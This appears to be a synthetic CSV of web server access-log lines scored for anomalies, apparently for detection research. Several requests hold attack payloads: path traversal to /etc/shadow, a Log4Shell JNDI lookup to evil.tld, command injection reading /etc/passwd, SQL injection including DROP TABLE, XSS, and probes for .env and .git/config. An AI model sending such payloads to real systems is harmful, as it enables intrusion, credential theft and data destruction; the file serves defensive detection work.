score_content,score_session,score_fused,line
5.831173896789551,0.7419780492782593,3.286575973033905,126.206.123.64 - - [10/Jan/2025:12:00:22 +0100] "GET /search?q=phone HTTP/1.1" 200 2185 "https://twitter.com/" "dirb/2.22"
1.6304885149002075,0.2644011378288269,0.9474448263645172,126.99.228.236 - - [10/Jan/2025:12:00:22 +0100] "GET /contact HTTP/1.1" 200 7604 "https://www.google.com/" "python-requests/2.31.0"
30.997051239013672,2.1081435680389404,16.552597403526306,177.172.68.127 - - [10/Jan/2025:12:00:22 +0100] "DELETE /search?q=phone HTTP/1.1" 200 17093 "https://example.com/" "sqlmap/1.7.2#stable"
26.7657527923584,1.2681593894958496,14.016956090927124,170.160.60.153 - - [10/Jan/2025:12:00:24 +0100] "DELETE /profile HTTP/1.1" 200 10607 "https://example.com/" "Wget/1.21.2 (linux-gnu)"
75.98064422607422,6.291736602783203,41.13619041442871,131.167.149.134 - - [10/Jan/2025:12:00:27 +0100] "OPTIONS /api/backup?file=../../../../etc/shadow HTTP/1.1" 200 4633 "-" "nikto/2.5.0"
76.07455444335938,8.531203269958496,42.302878856658936,199.52.180.132 - - [10/Jan/2025:12:00:27 +0100] "OPTIONS /?id=%24%7Bjndi%3Aldap%3A%2F%2Fevil.tld%2Fa%7D HTTP/1.1" 200 17002 "https://www.google.com/" "dirb/2.22"
4.35097074508667,0.4557173252105713,2.4033440351486206,162.105.144.160 - - [10/Jan/2025:12:00:30 +0100] "POST /contact HTTP/1.1" 200 9420 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
56.196720123291016,3788.400634765625,1922.298677444458,217.67.130.155 - - [10/Jan/2025:12:00:31 +0100] "HEAD /wp-login.php HTTP/1.1" 404 1014 "https://twitter.com/" "curl/7.85.0"
46.41103744506836,2.1807894706726074,24.295913457870483,252.78.96.233 - - [10/Jan/2025:12:00:34 +0100] "HEAD /api/products HTTP/1.1" 200 16081 "-" "nikto/2.5.0"
643.7960815429688,8185.0126953125,4414.404388427734,238.70.163.254 - - [10/Jan/2025:12:00:36 +0100] "OPTIONS /search?q=laptop HTTP/1.1" 500 1393 "-" "Wget/1.21.2 (linux-gnu)"
26.7186336517334,1.3777035474777222,14.04816859960556,220.126.109.32 - - [10/Jan/2025:12:00:39 +0100] "DELETE /dashboard HTTP/1.1" 200 14323 "https://twitter.com/" "nikto/2.5.0"
0.24439683556556702,0.3349214792251587,0.28965915739536285,246.167.129.117 - - [10/Jan/2025:12:00:40 +0100] "GET /assets/app.js HTTP/1.1" 200 1462 "-" "dirb/2.22"
1.859578251838684,0.5877224802970886,1.2236503660678864,224.27.253.99 - - [10/Jan/2025:12:00:41 +0100] "GET / HTTP/1.1" 201 2289 "https://example.com/" "python-requests/2.31.0"
0.25119608640670776,0.7098066210746765,0.48050135374069214,178.137.182.246 - - [10/Jan/2025:12:00:44 +0100] "GET /assets/app.css HTTP/1.1" 201 12678 "https://example.com/" "dirb/2.22"
102.87810516357422,3.967456579208374,53.422780871391296,5.95.156.185 - - [10/Jan/2025:12:00:45 +0100] "TRACE /profile HTTP/1.1" 200 17800 "https://twitter.com/" "Wget/1.21.2 (linux-gnu)"
0.23676985502243042,0.34263116121292114,0.2897005081176758,112.8.136.138 - - [10/Jan/2025:12:00:48 +0100] "GET /assets/app.css HTTP/1.1" 200 7605 "https://example.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
11.606685638427734,0.8104922771453857,6.20858895778656,187.223.239.160 - - [10/Jan/2025:12:00:50 +0100] "PUT /.env HTTP/1.1" 200 8029 "-" "curl/7.85.0"
0.239002525806427,0.4296998381614685,0.33435118198394775,146.184.71.154 - - [10/Jan/2025:12:00:51 +0100] "GET /assets/app.css HTTP/1.1" 200 8233 "https://twitter.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
46.475650787353516,1.583959698677063,24.02980524301529,165.71.235.186 - - [10/Jan/2025:12:00:53 +0100] "HEAD /logout HTTP/1.1" 200 4266 "https://twitter.com/" "dirb/2.22"
0.322264164686203,0.2753172814846039,0.29879072308540344,48.161.115.11 - - [10/Jan/2025:12:00:55 +0100] "GET /index.html HTTP/1.1" 201 5713 "https://www.google.com/" "sqlmap/1.7.2#stable"
576.4406127929688,8297.1044921875,4436.772552490234,9.31.40.20 - - [10/Jan/2025:12:00:57 +0100] "POST /search?q=ssd HTTP/1.1" 502 1197 "https://news.ycombinator.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
12.719063758850098,2.211953639984131,7.465508699417114,71.217.138.183 - - [10/Jan/2025:12:01:00 +0100] "PUT /contact HTTP/1.1" 204 10154 "https://twitter.com/" "curl/7.85.0"
10.582566261291504,947.1907958984375,478.8866810798645,49.239.41.150 - - [10/Jan/2025:12:01:01 +0100] "POST /search?q=camera HTTP/1.1" 302 1819 "https://twitter.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
12.695162773132324,1.9855930805206299,7.340377926826477,21.13.62.46 - - [10/Jan/2025:12:01:01 +0100] "PUT /profile HTTP/1.1" 204 1813 "https://example.com/" "Wget/1.21.2 (linux-gnu)"
71.94295501708984,4.094107151031494,38.01853108406067,153.66.165.55 - - [10/Jan/2025:12:01:02 +0100] "OPTIONS /login HTTP/1.1" 200 178 "https://example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
0.34709155559539795,0.4898379445075989,0.4184647500514984,126.179.250.3 - - [10/Jan/2025:12:01:04 +0100] "GET /index.html HTTP/1.1" 200 12230 "-" "dirb/2.22"
12.744269371032715,1.0076913833618164,6.875980377197266,3.4.8.84 - - [10/Jan/2025:12:01:06 +0100] "PUT /contact HTTP/1.1" 200 15472 "https://twitter.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
7.802751064300537,948.650634765625,478.22669291496277,42.88.226.120 - - [10/Jan/2025:12:01:06 +0100] "GET /api/run?cmd=cat+%2Fetc%2Fpasswd HTTP/1.1" 302 4925 "-" "dirb/2.22"
16.92847442626953,1.425276517868042,9.176875472068787,200.208.161.226 - - [10/Jan/2025:12:01:06 +0100] "PUT /search?q=camera HTTP/1.1" 200 11564 "https://example.com/" "nikto/2.5.0"
102.8733139038086,3.9563841819763184,53.414849042892456,7.196.154.167 - - [10/Jan/2025:12:01:07 +0100] "TRACE /profile HTTP/1.1" 200 16003 "https://news.ycombinator.com/" "Wget/1.21.2 (linux-gnu)"
8.421911239624023,1.713857650756836,5.06788444519043,171.254.229.127 - - [10/Jan/2025:12:01:08 +0100] "POST /search?q=%27+OR+1%3D1+-- HTTP/1.1" 200 7838 "https://news.ycombinator.com/" "python-requests/2.31.0"
1.61444890499115,0.11121293902397156,0.8628309220075607,204.110.181.232 - - [10/Jan/2025:12:01:11 +0100] "GET /contact HTTP/1.1" 200 2741 "https://news.ycombinator.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
568.1221313476562,8188.42724609375,4378.274688720703,91.16.226.182 - - [10/Jan/2025:12:01:12 +0100] "GET /cgi-bin/test.cgi HTTP/1.1" 500 49 "https://news.ycombinator.com/" "sqlmap/1.7.2#stable"
48.59378433227539,985.5694580078125,517.081621170044,213.100.220.83 - - [10/Jan/2025:12:01:15 +0100] "HEAD /logout HTTP/1.1" 304 16208 "https://twitter.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
1.552450180053711,0.2628578245639801,0.9076540023088455,50.30.147.156 - - [10/Jan/2025:12:01:15 +0100] "GET /api/products HTTP/1.1" 200 5263 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
107.07402801513672,4.766432762145996,55.92023038864136,87.61.105.167 - - [10/Jan/2025:12:01:17 +0100] "TRACE /api/product?id=123 HTTP/1.1" 200 15507 "https://news.ycombinator.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
11.29464340209961,3748.730712890625,1880.0126781463623,153.202.96.213 - - [10/Jan/2025:12:01:19 +0100] "GET /assets/app.css HTTP/1.1" 403 1231 "https://www.google.com/" "sqlmap/1.7.2#stable"
45.11323165893555,1.8348802328109741,23.47405594587326,88.86.190.128 - - [10/Jan/2025:12:01:20 +0100] "HEAD /wp-login.php HTTP/1.1" 200 8748 "https://example.com/" "dirb/2.22"
46.45480728149414,1.7128273248672485,24.083817303180695,76.197.208.107 - - [10/Jan/2025:12:01:21 +0100] "HEAD /profile HTTP/1.1" 200 7236 "https://example.com/" "nikto/2.5.0"
107.02511596679688,4.326252460479736,55.675684213638306,172.148.72.13 - - [10/Jan/2025:12:01:21 +0100] "TRACE /search?q=monitor HTTP/1.1" 200 9527 "https://news.ycombinator.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
8.512726783752441,4.087070941925049,6.299898862838745,146.46.48.194 - - [10/Jan/2025:12:01:21 +0100] "POST /api/backup?file=../../../../etc/shadow HTTP/1.1" 200 5022 "https://twitter.com/" "nikto/2.5.0"
618.5194702148438,8186.50439453125,4402.511932373047,74.38.213.231 - - [10/Jan/2025:12:01:24 +0100] "HEAD /search?q=phone HTTP/1.1" 500 205 "https://twitter.com/" "nikto/2.5.0"
50.63320541381836,2.202504873275757,26.417855143547058,126.229.29.71 - - [10/Jan/2025:12:01:25 +0100] "HEAD /search?q=camera HTTP/1.1" 200 2767 "https://news.ycombinator.com/" "python-requests/2.31.0"
30.951335906982422,1.7888649702072144,16.370100438594818,181.131.194.238 - - [10/Jan/2025:12:01:25 +0100] "DELETE /search?q=camera HTTP/1.1" 200 8698 "-" "dirb/2.22"
5.7753825187683105,1.39227294921875,3.5838277339935303,46.186.171.53 - - [10/Jan/2025:12:01:25 +0100] "GET /search?q=headphones HTTP/1.1" 200 12219 "https://news.ycombinator.com/" "Wget/1.21.2 (linux-gnu)"
50.618839263916016,2.4242050647735596,26.521522164344788,51.142.138.83 - - [10/Jan/2025:12:01:27 +0100] "HEAD /search?q=monitor HTTP/1.1" 200 1209 "https://news.ycombinator.com/" "dirb/2.22"
4.375601291656494,0.8062740564346313,2.5909376740455627,222.80.69.129 - - [10/Jan/2025:12:01:28 +0100] "POST /profile HTTP/1.1" 200 17655 "https://twitter.com/" "python-requests/2.31.0"
5.9192962646484375,2.796595335006714,4.357945799827576,187.157.126.147 - - [10/Jan/2025:12:01:28 +0100] "GET /search?q=ssd HTTP/1.1" 204 19786 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
31.004108428955078,2.103473663330078,16.553791046142578,106.81.52.56 - - [10/Jan/2025:12:01:29 +0100] "DELETE /search?q=phone HTTP/1.1" 200 19860 "-" "python-requests/2.31.0"
75.9977798461914,3.008159875869751,39.50296986103058,250.162.76.86 - - [10/Jan/2025:12:01:32 +0100] "OPTIONS /search?q=camera HTTP/1.1" 200 3060 "https://twitter.com/" "curl/7.85.0"
4.369474411010742,0.7459416389465332,2.5577080249786377,115.4.231.188 - - [10/Jan/2025:12:01:33 +0100] "POST /contact HTTP/1.1" 200 15398 "https://example.com/" "nikto/2.5.0"
46.51753234863281,1.7654683589935303,24.14150035381317,14.15.134.242 - - [10/Jan/2025:12:01:34 +0100] "HEAD /login HTTP/1.1" 200 6886 "https://news.ycombinator.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
0.2752086818218231,0.5926153063774109,0.433911994099617,250.86.17.201 - - [10/Jan/2025:12:01:35 +0100] "GET /assets/app.js HTTP/1.1" 200 12650 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
8.0009183883667,935.6950073242188,471.8479628562927,33.170.36.252 - - [10/Jan/2025:12:01:36 +0100] "GET /search?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E HTTP/1.1" 301 15147 "-" "dirb/2.22"
1.8821383714675903,0.6581441760063171,1.2701412737369537,149.33.120.114 - - [10/Jan/2025:12:01:38 +0100] "GET / HTTP/1.1" 200 8641 "https://news.ycombinator.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
82.97206115722656,3789.355224609375,1936.1636428833008,57.55.130.150 - - [10/Jan/2025:12:01:41 +0100] "OPTIONS /login HTTP/1.1" 404 995 "https://news.ycombinator.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
0.24208973348140717,0.15956996381282806,0.20082984864711761,73.39.98.134 - - [10/Jan/2025:12:01:42 +0100] "GET /assets/app.js HTTP/1.1" 200 2309 "https://www.google.com/" "nikto/2.5.0"
3.7354934215545654,929.785888671875,466.7606910467148,22.143.87.90 - - [10/Jan/2025:12:01:42 +0100] "GET /logout HTTP/1.1" 301 17410 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
2.8987133502960205,0.43802711367607117,1.6683702319860458,135.46.232.209 - - [10/Jan/2025:12:01:43 +0100] "POST /cgi-bin/test.cgi HTTP/1.1" 200 3613 "-" "curl/7.85.0"
17.04218864440918,7.386198997497559,12.21419382095337,76.125.211.49 - - [10/Jan/2025:12:01:43 +0100] "PUT /search?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E HTTP/1.1" 200 14638 "https://example.com/" "curl/7.85.0"
75.99806213378906,3.0262949466705322,39.5121785402298,57.195.206.235 - - [10/Jan/2025:12:01:43 +0100] "OPTIONS /search?q=laptop HTTP/1.1" 200 3190 "https://news.ycombinator.com/" "sqlmap/1.7.2#stable"
4.420453071594238,0.5562029480934143,2.4883280098438263,195.165.30.58 - - [10/Jan/2025:12:01:43 +0100] "POST /login HTTP/1.1" 200 11098 "https://www.google.com/" "python-requests/2.31.0"
26.581439971923828,0.970456063747406,13.775948017835617,17.59.250.236 - - [10/Jan/2025:12:01:45 +0100] "DELETE /server-status HTTP/1.1" 200 2050 "https://twitter.com/" "dirb/2.22"
0.2705238163471222,0.8847704529762268,0.5776471346616745,202.129.254.57 - - [10/Jan/2025:12:01:45 +0100] "GET /assets/app.css HTTP/1.1" 200 18719 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
5.814144611358643,0.7391878962516785,3.2766662538051605,44.64.174.114 - - [10/Jan/2025:12:01:45 +0100] "GET /search?q=router HTTP/1.1" 200 3927 "https://twitter.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
107.0672607421875,4.7226738929748535,55.89496731758118,161.134.9.168 - - [10/Jan/2025:12:01:45 +0100] "TRACE /search?q=camera HTTP/1.1" 200 17651 "https://www.google.com/" "python-requests/2.31.0"
106.99266815185547,6.363324165344238,56.67799615859985,73.91.104.51 - - [10/Jan/2025:12:01:46 +0100] "TRACE /api/run?cmd=cat+%2Fetc%2Fpasswd HTTP/1.1" 200 15752 "https://www.google.com/" "dirb/2.22"
50.65846252441406,2.482947587966919,26.57070505619049,155.47.165.155 - - [10/Jan/2025:12:01:48 +0100] "HEAD /search?q=camera HTTP/1.1" 200 10434 "https://example.com/" "dirb/2.22"
0.22655870020389557,0.24697332084178925,0.2367660105228424,89.246.150.154 - - [10/Jan/2025:12:01:51 +0100] "GET /assets/app.css HTTP/1.1" 200 4776 "https://www.google.com/" "Wget/1.21.2 (linux-gnu)"
13.308426856994629,986.3339233398438,499.8211750984192,17.132.108.7 - - [10/Jan/2025:12:01:53 +0100] "PUT /..%2f..%2fetc%2fpasswd HTTP/1.1" 304 15348 "https://www.google.com/" "curl/7.85.0"
0.3497227430343628,0.5745905637741089,0.46215665340423584,200.147.43.142 - - [10/Jan/2025:12:01:56 +0100] "GET /index.html HTTP/1.1" 200 13088 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
26.702638626098633,1.1390434503555298,13.920841038227081,75.85.4.146 - - [10/Jan/2025:12:01:56 +0100] "DELETE /dashboard HTTP/1.1" 200 9186 "https://example.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
107.0646743774414,4.3620219230651855,55.713348150253296,186.128.72.53 - - [10/Jan/2025:12:01:57 +0100] "TRACE /search?q=phone HTTP/1.1" 201 10550 "https://www.google.com/" "python-requests/2.31.0"
8.567195892333984,1.3501708507537842,4.958683371543884,62.79.219.180 - - [10/Jan/2025:12:02:00 +0100] "POST /search?q=router HTTP/1.1" 200 15689 "https://twitter.com/" "curl/7.85.0"
5.812081813812256,0.9986621737480164,3.405371993780136,49.106.104.235 - - [10/Jan/2025:12:02:01 +0100] "GET /search?q=monitor HTTP/1.1" 200 8686 "https://www.google.com/" "python-requests/2.31.0"
46.53269958496094,2.0987651348114014,24.31573235988617,70.175.3.55 - - [10/Jan/2025:12:02:04 +0100] "HEAD /login HTTP/1.1" 201 12141 "https://www.google.com/" "sqlmap/1.7.2#stable"
78.04146575927734,930.4365844726562,504.2390251159668,24.209.233.236 - - [10/Jan/2025:12:02:07 +0100] "OPTIONS /search?q=laptop HTTP/1.1" 301 2915 "https://www.google.com/" "sqlmap/1.7.2#stable"
73.92068481445312,984.7173461914062,529.3190155029297,198.234.128.141 - - [10/Jan/2025:12:02:07 +0100] "OPTIONS /contact HTTP/1.1" 304 14612 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
50.686073303222656,2.4921963214874268,26.58913481235504,151.156.76.32 - - [10/Jan/2025:12:02:07 +0100] "HEAD /search?q=phone HTTP/1.1" 200 12763 "https://twitter.com/" "nikto/2.5.0"
103.5767822265625,931.8510131835938,517.7138977050781,40.13.232.95 - - [10/Jan/2025:12:02:08 +0100] "TRACE /.git/config HTTP/1.1" 301 535 "https://twitter.com/" "python-requests/2.31.0"
0.3299572765827179,0.2489573061466217,0.2894572913646698,190.238.57.250 - - [10/Jan/2025:12:02:08 +0100] "GET /index.html HTTP/1.1" 200 7152 "https://example.com/" "nikto/2.5.0"
0.2340208888053894,0.3517310619354248,0.2928759753704071,116.197.116.251 - - [10/Jan/2025:12:02:09 +0100] "GET /assets/app.css HTTP/1.1" 200 6843 "-" "Wget/1.21.2 (linux-gnu)"
107.07424926757812,4.728255748748779,55.90125250816345,180.20.62.235 - - [10/Jan/2025:12:02:09 +0100] "TRACE /api/user?id=1;DROP TABLE users HTTP/1.1" 200 15595 "https://example.com/" "curl/7.85.0"
3.9468202590942383,983.4282836914062,493.68755197525024,10.152.137.197 - - [10/Jan/2025:12:02:10 +0100] "GET / HTTP/1.1" 304 5260 "-" "Wget/1.21.2 (linux-gnu)"
30.953039169311523,1.7977039813995361,16.37537157535553,156.225.93.12 - - [10/Jan/2025:12:02:13 +0100] "DELETE /search?q=camera HTTP/1.1" 200 9196 "https://twitter.com/" "curl/7.85.0"
48.428245544433594,930.7946166992188,489.6114311218262,151.122.34.46 - - [10/Jan/2025:12:02:16 +0100] "HEAD /dashboard HTTP/1.1" 301 2785 "https://twitter.com/" "python-requests/2.31.0"
46.52487564086914,3.425503730773926,24.975189685821533,55.118.196.104 - - [10/Jan/2025:12:02:19 +0100] "HEAD /contact HTTP/1.1" 200 151 "https://news.ycombinator.com/" "nikto/2.5.0"
1.7066168785095215,0.6365373134613037,1.1715770959854126,114.29.132.137 - - [10/Jan/2025:12:02:22 +0100] "GET /login HTTP/1.1" 201 11940 "https://twitter.com/" "dirb/2.22"
3.2138869762420654,0.3394380509853363,1.7766625136137009,38.228.92.67 - - [10/Jan/2025:12:02:24 +0100] "POST /.env HTTP/1.1" 200 2507 "https://news.ycombinator.com/" "dirb/2.22"
50.54779052734375,3.386509656906128,26.96715009212494,2.67.177.53 - - [10/Jan/2025:12:02:27 +0100] "HEAD /search?q=%27+OR+1%3D1+-- HTTP/1.1" 200 13575 "https://news.ycombinator.com/" "nikto/2.5.0"
71.76728057861328,2.742201328277588,37.254740953445435,50.146.62.28 - - [10/Jan/2025:12:02:30 +0100] "OPTIONS /dashboard HTTP/1.1" 201 9958 "https://twitter.com/" "python-requests/2.31.0"
27.930295944213867,3677.640380859375,1852.7853384017944,235.75.202.156 - - [10/Jan/2025:12:02:32 +0100] "PUT /search?q=router HTTP/1.1" 401 712 "https://news.ycombinator.com/" "sqlmap/1.7.2#stable"
50.71798324584961,2.317509412765503,26.517746329307556,167.42.241.146 - - [10/Jan/2025:12:02:34 +0100] "HEAD /search?q=ssd HTTP/1.1" 200 8813 "https://example.com/" "curl/7.85.0"
1.705440640449524,0.45163923501968384,1.0785399377346039,125.148.83.225 - - [10/Jan/2025:12:02:36 +0100] "GET /login HTTP/1.1" 200 10800 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
16.918729782104492,1.3807878494262695,9.14975881576538,128.111.110.35 - - [10/Jan/2025:12:02:36 +0100] "PUT /api/user?id=1;DROP TABLE users HTTP/1.1" 200 4811 "https://www.google.com/" "curl/7.85.0"
16.829347610473633,2.9513041973114014,9.890325903892517,11.141.196.116 - - [10/Jan/2025:12:02:36 +0100] "PUT /api/run?cmd=cat+%2Fetc%2Fpasswd HTTP/1.1" 200 3187 "https://news.ycombinator.com/" "python-requests/2.31.0"
50.7447624206543,2.64643931388855,26.695600867271423,22.224.246.237 - - [10/Jan/2025:12:02:37 +0100] "HEAD /search?q=ssd HTTP/1.1" 200 17755 "https://example.com/" "dirb/2.22"
107.05323028564453,7.905921936035156,57.479576110839844,26.6.204.113 - - [10/Jan/2025:12:02:37 +0100] "TRACE /api/backup?file=../../../../etc/shadow HTTP/1.1" 200 19397 "https://www.google.com/" "python-requests/2.31.0"
76.06671905517578,3.708341360092163,39.88753020763397,221.191.126.202 - - [10/Jan/2025:12:02:38 +0100] "OPTIONS /search?q=phone HTTP/1.1" 200 18754 "https://twitter.com/" "Wget/1.21.2 (linux-gnu)"
12.755840301513672,1.1685314178466797,6.962185859680176,172.50.140.232 - - [10/Jan/2025:12:02:41 +0100] "PUT /contact HTTP/1.1" 200 19909 "-" "nikto/2.5.0"
0.25292062759399414,0.23467029631137848,0.2437954619526863,13.114.130.116 - - [10/Jan/2025:12:02:43 +0100] "GET /assets/app.js HTTP/1.1" 200 6091 "https://twitter.com/" "python-requests/2.31.0"
52.72801208496094,931.0953369140625,491.9116744995117,168.154.47.99 - - [10/Jan/2025:12:02:45 +0100] "HEAD /search?q=router HTTP/1.1" 301 19450 "https://example.com/" "sqlmap/1.7.2#stable"
47.176612854003906,949.0391845703125,498.1078987121582,145.150.129.185 - - [10/Jan/2025:12:02:45 +0100] "HEAD /wp-login.php HTTP/1.1" 302 496 "https://twitter.com/" "sqlmap/1.7.2#stable"
50.68946838378906,2.5104880332946777,26.59997820854187,100.143.229.198 - - [10/Jan/2025:12:02:46 +0100] "HEAD /search?q=phone HTTP/1.1" 200 13903 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
